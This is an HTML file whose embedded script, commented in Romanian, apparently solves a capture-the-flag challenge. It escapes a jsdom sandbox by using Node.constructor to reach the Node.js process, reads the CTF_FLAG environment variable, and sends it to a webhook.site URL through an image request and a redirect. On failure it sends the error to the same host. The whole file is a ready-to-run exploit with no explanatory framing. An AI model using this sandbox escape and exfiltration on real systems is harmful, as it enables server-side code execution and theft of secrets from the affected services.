<!DOCTYPE html><!DOCTYPE html>
<html>
<body>
    <script>
        try {
            // Aceasta este singura metodă care funcționează pentru jsdom 16.5.3
            const constructorulMeu = Node.constructor;
            const procesulNode = new constructorulMeu("return process")();
            const steag = procesulNode.env.CTF_FLAG;

            // Trimitem flag-ul prin URL către Webhook
            // Folosim un nume de variabilă clar: 'REZULTAT'
            const link = "https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?REZULTAT=" + steag;
            
            // Forțăm trimiterea prin două metode simultan pentru siguranță
            new Image().src = link;
            window.location.href = link;

        } catch (e) {
            // Dacă tot dă eroare, trimitem eroarea nouă
            new Image().src = "https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/eroare_noua?detalii=" + btoa(e.message);
        }
    </script>
</body>
</html>
